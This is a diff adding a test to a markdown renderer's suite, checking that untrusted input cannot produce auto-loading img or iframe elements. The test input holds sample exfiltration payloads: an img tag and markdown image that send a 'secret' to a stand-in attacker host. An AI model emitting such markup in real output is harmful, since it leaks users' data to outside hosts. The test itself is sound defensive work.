@@ -44,6 +44,16 @@ describe("inline emphasis", () => {
     assert.ok(html.includes('<strong>see <a href="https://example.com/x"'));
   });
 
+  test("untrusted markdown cannot create auto-loading HTML elements", () => {
+    const html = renderMarkdown(
+      '<img src="https://attacker.invalid/?secret=x"> ![alt](https://attacker.invalid/x) ' +
+      '<iframe src="https://attacker.invalid/x"></iframe>',
+    );
+    assert.ok(!/<(?:img|iframe|link)\b/i.test(html));
+    assert.ok(html.includes("&lt;img src=&quot;"));
+    assert.ok(html.includes("&lt;iframe src=&quot;"));
+  });
+
   test("a lone star in prose is left alone", () => {
     assert.equal(renderMarkdown("5 * 3 = 15"), "<p>5 * 3 = 15</p>");
   });
